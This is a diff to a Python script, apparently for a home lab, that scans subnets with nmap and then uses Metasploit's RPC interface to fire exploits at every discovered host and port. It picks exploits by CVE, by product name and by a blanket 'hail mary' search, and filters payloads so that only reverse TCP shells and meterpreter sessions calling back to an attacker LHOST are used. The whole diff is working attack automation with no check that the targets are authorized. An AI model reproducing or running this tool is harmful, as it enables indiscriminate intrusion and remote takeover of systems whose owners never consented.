@@ -22,7 +22,7 @@ import pymetasploit3.msfrpc as msfrpc
 
 # Options
 subnets = ["192.168.1.0/24"] # Specify CIDR subnets here.
-ignore_ips = ["192.168.1.1", "192.168.1.105"]  # Specify IPs to ignore here.
+ignore_ips = ["192.168.1.1", "192.168.1.105", "192.168.1.255"]  # Specify IPs to ignore here.
 metasploit_modules_dir = "/usr/share/metasploit-framework/modules/" # Set the metasploit modules directory.
 if not os.path.isdir(metasploit_modules_dir):
     metasploit_modules_dir = "/opt/metasploit/modules/"
@@ -49,6 +49,7 @@ ip_list_filename = "ip_list.txt"
 # Metasploit options.
 msfconsole_command = 'msfconsole -x "use {};set RHOSTS {};set RPORT {};set LHOST {};set LPORT 443;show targets"'
 payload_lhost = "192.168.1.105"
+payload_lport = 1000 # Starting lport.
 
 # Metasploit Control Options
 msf_client: msfrpc.MsfRpcClient = None
@@ -60,6 +61,7 @@ msf_port: int = 55552 # Metasploit RPC port
 msf_do_ssl: bool = False # Turn on or off SSL for RPC control.
 msf_username: str = "msf" # Metasploit username for RPC control
 msf_password: str = "msf_pass" # Super secret metasploit password for RPC control.
+msf_search_result_max: int = 10 # Try exploits on at most this number of search results.
 
 # Global varibales.
 ip_list_string = ""
@@ -69,6 +71,7 @@ scan_thread_list = []
 ping_thread_list = []
 all_scan_results = {}
 all_scan_reports = []
+all_attempted_msf_exploits = {}
 
 # ======================================================================================================================
 # SCANNING / PINGING / CVE-FINDING / REPORT CREATION FUNCTIONS
@@ -86,8 +89,8 @@ def scan_host(ip: str, do_full_scan=False):
 
     full_nmap_args = nmap_args + " "
     if do_full_scan:
-        pass
-        # full_nmap_args += "-p-"
+        # pass
+        full_nmap_args += "-p-"
     else:
         prefix = "-p"
         for port in target_ports:
@@ -141,9 +144,19 @@ def scan_host(ip: str, do_full_scan=False):
 def ping_host(ip:str):
     global ip_list_string
     global ping_timeout
+    retry_count = 3
 
     ip = ip.strip()
-    ping_result = ping3.ping(ip, timeout=ping_timeout)
+    while retry_count > 0:
+        try:
+            ping_result = ping3.ping(ip, timeout=ping_timeout)
+            retry_count = 0
+        except:
+            retry_count -= 1
+            if retry_count <= 0:
+                print(f"PING ERROR: {ip}")
+                return
+
     if ping_result is not None and type(ping_result) is not bool:
         print(f"Ping reply from {ip}")
         ip_list_string += ip + "\n"
@@ -308,7 +321,7 @@ def start_metasploit_tmux():
     for line in result.stdout.decode("UTF-8").splitlines():
         if line.find(f"{tmux_session}:") == 0:
             print("Metasploit tmux session already exists.")
-            send_keys_to_msfconsole(start_rpc_cmd)
+            # send_keys_to_msfconsole(start_rpc_cmd)
             do_start_tmux = False
 
     if do_start_tmux and os.fork() == 0:
@@ -345,6 +358,24 @@ def get_console_output_of_msfconsole():
 
 def run_msf_exploit(exploit_name: str, rhosts: str, rport: int):
     global msf_client
+
+    def execute_payload_async(payload_name: str, exploit):
+        global payload_lhost
+        global payload_lport
+
+        msf_payload = msf_client.modules.use('payload', payload_name)
+        try:
+            msf_payload['LHOST'] = payload_lhost
+        except:
+            pass
+        try:
+            msf_payload['LPORT'] = payload_lport
+        except:
+            pass
+        payload_lport += 1
+        try: exploit.execute(payload=msf_payload)
+        except: pass
+
     if msf_client is None:
         return
 
@@ -352,9 +383,58 @@ def run_msf_exploit(exploit_name: str, rhosts: str, rport: int):
     if exploit_name.find('exploits/') == 0:
         exploit_name = exploit_name.replace('exploits/', '', 1)
 
+    if is_msf_exploit_untested(rhosts, rport, exploit_name):
+        log_msf_exploit_attempt(rhosts, rport, exploit_name)
+    else:
+        print(f"Already attempted: {rhosts}:{rport} - {exploit_name}")
+        return
+
     exploit = msf_client.modules.use('exploit', exploit_name)
-    exploit['RHOSTS'] = rhosts
-    exploit['RPORT'] = str(rport)
+    try:
+        exploit['RHOSTS'] = rhosts
+    except:
+        pass
+
+    try:
+        exploit['RPORT'] = str(rport)
+    except:
+        pass
+
+    for payload in exploit.targetpayloads():
+        # Ignore all the payloads we don't want to try...
+        if payload.upper().find('BIND') > 0:
+            # print("Ignoring bind exploits....")
+            continue
+
+        if payload.upper().find('NAMED_PIPE') > 0:
+            # print("Ignoring named pipe exploits....")
+            continue
+
+        if payload.upper().find('IPV6') > 0:
+            # print("Ignoring ipv6 exploits....")
+            continue
+
+        if payload.upper().find('INTERACT') > 0 or (payload.upper().find('REVERSE_TCP') > 0 and payload.upper().find('REVERSE_TCP_') < 0):
+            pass
+        else:
+            # print("Not an interactive nor reverse shell...")
+            continue
+
+        if payload.upper().find("INTERACT") > 0 or payload.upper().find("SHELL") > 0 or payload.upper().find("METERPRETER") > 0:
+            pass
+        else:
+            # print("Not an interact, shell, nor meteterpreter session.")
+            continue
+
+        if payload.upper().find("POWERSHELL") > 0:
+            # print("Ignoring powershell.")
+            continue
+
+        # print(f"Attempting {rhosts}:{rport} - {exploit_name}:{payload}")
+
+        # new_thread = threading.Thread(target=execute_payload_async, args=[payload, exploit])
+        # new_thread.start()
+        execute_payload_async(payload, exploit)
 
 
 def run_msf_search(search_args: str):
@@ -387,18 +467,108 @@ def run_msf_search(search_args: str):
     return all_results
 
 
-def run_msf_hail_mary(rhost: str, rport: int):
+def run_msf_hail_mary_on_ip_port(rhost: str, rport: int):
     global msf_client
+    global msf_search_result_max
+    exploit_count = 0
 
-    search_results = run_msf_search(f"port:{str(rport)} rank:excellent")
+    search_results = run_msf_search(f"port:{str(rport)} type:exploit rank:excellent -s date -r")
 
     for result in search_results:
-        print(result)
+        if exploit_count < msf_search_result_max:
+            # print(result)
+            if is_msf_exploit_untested(rhost, rport, result[1]):
+                run_msf_exploit(result[1], rhost, rport)
+                exploit_count += 1
+        # new_thread = threading.Thread(target=run_msf_exploit, args=[result[1], rhost, rport])
+        # new_thread.start()
+
+
+def run_msf_against_cve(cve: str, rhost: str, rports:list):
+    global msf_search_result_max
+    exploit_count = 0
+    search_results = run_msf_search(f"cve:{cve} type:exploit rank:excellent -s date -r")
+
+    for result in search_results:
+        for rport in rports:
+            if exploit_count < msf_search_result_max:
+                if is_msf_exploit_untested(rhost, rport, result[1]):
+                    run_msf_exploit(result[1], rhost, rport)
+                    exploit_count += 1
+            # new_thread = threading.Thread(target=run_msf_exploit, args=[result[1], rhost, rport])
+            # new_thread.start()
+
+
+def run_msf_against_product(product: str, rhost: str, rport:int):
+    global msf_search_result_max
+    exploit_count = 0
+    search_results = run_msf_search(f"description:{product} type:exploit rank:excellent  -s date -r")
+
+    for result in search_results:
+        if exploit_count < msf_search_result_max:
+            if is_msf_exploit_untested(rhost, rport, result[1]):
+                run_msf_exploit(result[1], rhost, rport)
+                exploit_count += 1
+        # new_thread = threading.Thread(target=run_msf_exploit, args=[result[1], rhost, rport])
+        # new_thread.start()
+
+
+def run_msf_against_scan_result_cves(scan_result):
+    for ip in scan_result:
+        for product in scan_result[ip]['vulns']:
+            for cve in scan_result[ip]['vulns'][product]:
+                ports = get_ports_from_product(scan_result, ip, product)
+                run_msf_against_cve(cve, ip, ports)
+
+
+def run_msf_against_scan_result_products(scan_result):
+    for ip in scan_result:
+        for port in scan_result[ip]['ports']:
+            product = scan_result[ip]['ports'][port]['product']
+            if len(product) > 1:
+                run_msf_against_product(product, ip, port)
+
+
+def run_msf_hail_mary_scan_result(scan_result):
+    for ip in scan_result:
+        for port in scan_result[ip]['ports']:
+            run_msf_hail_mary_on_ip_port(ip, port)
+
+
+def log_msf_exploit_attempt(ip: str, rport:int, exploit_name:str):
+    global all_attempted_msf_exploits
+
+    if not ip in all_attempted_msf_exploits:
+        all_attempted_msf_exploits[ip] = {}
+
+    if not str(rport) in all_attempted_msf_exploits[ip]:
+        all_attempted_msf_exploits[ip][rport] = []
+
+    if not exploit_name in all_attempted_msf_exploits[ip][str(rport)]:
+        all_attempted_msf_exploits[ip][str(rport)].append(exploit_name)
+
+
+def is_msf_exploit_untested(ip: str, rport:int, exploit_name:str):
+    global all_attempted_msf_exploits
+
+    if exploit_name.find('vsftp') > 0:
+        print("Debug here.")
+
+    if ip not in all_attempted_msf_exploits:
+        return True
+
+    if str(rport) not in all_attempted_msf_exploits[ip]:
+        return True
+
+    if exploit_name not in all_attempted_msf_exploits[ip][str(rport)]:
+        return True
+
+    return False
 
 
 def metasploit_test():
     start_metasploit_tmux()
-    run_msf_hail_mary("192.168.1.102", 21)
+    run_msf_hail_mary_on_ip_port("192.168.1.102", 21)
     time.sleep(2)
     # print(get_console_output_of_msfconsole())
 
@@ -413,6 +583,7 @@ def main():
     global subnets
     global ip_list_string
     global all_scan_results
+    global all_attempted_msf_exploits
     global ignore_ips
     global max_ping_threads
     global max_scan_threads
@@ -475,7 +646,26 @@ def main():
         with open(results_dir + "partial_report.txt", "w") as outfile:
             outfile.write(assemble_final_report())
 
+    if os.path.isfile(results_dir + "exploits_attempted.json"):
+        with open(results_dir + "exploits_attempted.json", "r") as fp:
+            all_attempted_msf_exploits = json.load(fp)
+
+    print(all_attempted_msf_exploits)
+
+    print("Automatically running MSF exploits with CVEs...")
+    run_msf_against_scan_result_cves(all_scan_results)
+
+    print("Automatically running MSF exploits with Products...")
+    run_msf_against_scan_result_products(all_scan_results)
+
+    print("Automatically running MSF hail mary attack...")
+    run_msf_hail_mary_scan_result(all_scan_results)
+
+    with open(results_dir + "exploits_attempted.json", "w") as outfile:
+        json.dump(all_attempted_msf_exploits, outfile, indent=2)
+
 
 if __name__ == "__main__":
-    # main()
-    metasploit_test()
+    main()
+    # metasploit_test()
+    print("Done!")
